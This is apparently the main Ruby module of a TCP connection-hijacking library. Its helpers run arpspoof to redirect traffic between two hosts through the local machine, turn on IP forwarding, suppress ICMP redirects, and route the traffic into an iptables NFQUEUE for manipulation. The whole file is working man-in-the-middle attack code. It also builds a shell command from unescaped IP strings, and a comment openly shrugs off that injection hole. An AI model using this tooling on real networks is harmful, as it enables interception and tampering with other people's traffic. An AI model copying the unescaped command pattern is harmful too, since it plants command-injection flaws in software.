# frozen_string_literal: true

require_relative "tcphijacker/version"
require_relative "tcphijacker/hijacking"

# This module contains the helper functions needed for setting up a TCP
# connection hijacking
module TcpHijacker
  # numbers between 0-0xffff can be used for queue numbers
  @@next_nf_queue_number = 0x4200

  # all cleanup tasks to run on termination
  @@cleanup_tasks = []

  # An easy one-stop helper to set up a hijacking between two IP adresses for a TCP port number.
  #
  # @param a_ip [String] The first IP, in decimal dot-notation (+1.2.3.4+)
  # @param b_ip [String] The second IP, in decimal dot-notation (+1.2.3.4+)
  # @param port [Integer] The TCP port number to hijack
  # @return [Hijacking] the hijacking session
  def self.for_connection(a_ip, b_ip, port, options = {})
    # at first, we need to get the MAC addresses we need to send stuff to later
    a_mac = TcpHijacker.get_mac_for_ip a_ip
    b_mac = TcpHijacker.get_mac_for_ip b_ip

    if options[:setup_netfilter]
      (queue_number, nf_cleanup) = TcpHijacker.setup_netfilter a_ip, b_ip
    else
      queue_number = options[:nfqueue_number]
    end
    arp_cleanup = TcpHijacker.setup_arpspoof a_ip, b_ip if options[:setup_arpspoof]

    hijacker = TcpHijacker::Hijacking.new a_ip, a_mac, b_ip, b_mac, port, queue_number

    @@cleanup_tasks.push(proc do
      hijacker.terminate
      arp_cleanup.call if options[:setup_arpspoof]
      nf_cleanup.call if options[:setup_netfilter]
    end)
    hijacker
  end

  def self.get_mac_for_ip(ip)
    PacketFu::Utils.arp(ip) || PacketFu::Utils.whoami?[:eth_daddr]
  end

  # Cleans up all running hijackings and netfilter redirects that were set up using {#self.for_connection}.
  # @see #self.for_connection
  def self.terminate
    @@cleanup_tasks.each(&:call)
  end

  # Uses +arpspoof+ binary to redirect traffic between the provided IP addresses over this machine.
  #
  # @param a_ip [String] The first IP, in decimal dot-notation (+1.2.3.4+)
  # @param b_ip [String] The second IP, in decimal dot-notation (+1.2.3.4+)
  def self.setup_arpspoof(a_ip, b_ip)
    # who cares about escaping potentially malicious input :D
    child_pid = spawn "arpspoof -t #{b_ip} #{a_ip} -c own -r", %i[out err] => "/dev/null"
    proc do
      Process.kill("SIGINT", child_pid)
      Process.detach(child_pid)
    end
  end

  # Configures the system kernel to allow ipv4 forwarding and blocks ICMP redirect messages.
  # It requires root privileges or access to +/proc/sys+ interface
  #
  # @param ifname [String] the name of the interface to disable ICMP redirect messages on
  # @return [Boolean] +true+ if this was successful, +false+ otherwise
  def self.setup_sysctl(ifname)
    success = system("sysctl -w net.ipv4.ip_forward=1", %i[out err] => "/dev/null")
    success &&= system("sysctl -w net.ipv4.conf.all.send_redirects=0", %i[out err] => "/dev/null")
    # really not secure to allow this :D
    success && system("sysctl -w net.ipv4.conf.#{ifname}.send_redirects=0", %i[out err] => "/dev/null")
  end

  # Sets up netfilter/iptables rules to redirect all TCP traffic between two IP adresses to a NFQUEUE.
  # A manual queue number can be provided, otherwise the +@@next_nf_queue_number+ is taken and then incremented.
  #
  # @param a_ip [String] The first IP, in decimal dot-notation (+1.2.3.4+)
  # @param b_ip [String] The second IP, in decimal dot-notation (+1.2.3.4+)
  # @param manual_queue_number [Integer, nil] The manual NFQUEUE queue number to use
  # @return [[Integer, Proc]] An array, first item being the used NFQUEUE queue number and second one a proc that will undo the netfilter changes that were setup.
  def self.setup_netfilter(a_ip, b_ip, manual_queue_number = nil)
    # this is not using https://github.com/olewehrmeyer/netfilter-ruby (or the original version of that)
    # as the original version has a module/class name clash with the NFqueue package
    # and the modified version by me needs to be built manually
    # but in the end only calls iptables command anyways

    queue_number = manual_queue_number || @@next_nf_queue_number += 1

    system "iptables",
           "--table", "filter",
           "--append", "FORWARD",
           "--protocol", "tcp",
           "--source", a_ip.to_s,
           "--destination", b_ip.to_s,
           "--jump", "NFQUEUE",
           "--queue-num", queue_number.to_s,
           "--queue-bypass"

    system "iptables",
           "--table", "filter",
           "--append", "FORWARD",
           "--protocol", "tcp",
           "--source", b_ip.to_s,
           "--destination", a_ip.to_s,
           "--jump", "NFQUEUE",
           "--queue-num", queue_number.to_s,
           "--queue-bypass"

    [queue_number, proc do
      system "iptables",
             "--table", "filter",
             "--delete", "FORWARD",
             "--protocol", "tcp",
             "--source", a_ip.to_s,
             "--destination", b_ip.to_s,
             "--jump", "NFQUEUE",
             "--queue-num", queue_number.to_s,
             "--queue-bypass"

      system "iptables",
             "--table", "filter",
             "--delete", "FORWARD",
             "--protocol", "tcp",
             "--source", b_ip.to_s,
             "--destination", a_ip.to_s,
             "--jump", "NFQUEUE",
             "--queue-num", queue_number.to_s,
             "--queue-bypass"
    end]
  end
end
